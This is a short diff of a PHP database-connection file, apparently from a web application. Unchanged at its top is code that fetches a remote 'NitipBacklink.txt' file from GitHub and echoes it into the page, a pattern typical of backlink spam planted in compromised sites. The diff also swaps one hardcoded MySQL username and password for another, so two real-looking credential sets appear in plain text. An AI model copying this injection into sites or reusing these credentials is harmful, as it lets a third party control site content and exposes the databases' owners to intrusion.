@@ -1,12 +1,11 @@
-<?php
+<?php 
 $url = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 $result = curl_exec($ch);
 curl_close($ch);
 echo $result;
-?><?php 
-    $connection = mysqli_connect('localhost', 'clayfusi_clayusers', '[fhjfdq5Sn~[', 'clayfusi_claytradesdb'); 
+    $connection = mysqli_connect('localhost', 'futuretr_Exchange', 'Qd$v@Z}*iBTu', 'futuretr_Exchange'); 
     if (!$connection) {
         die('error connecting to database');
     }else {
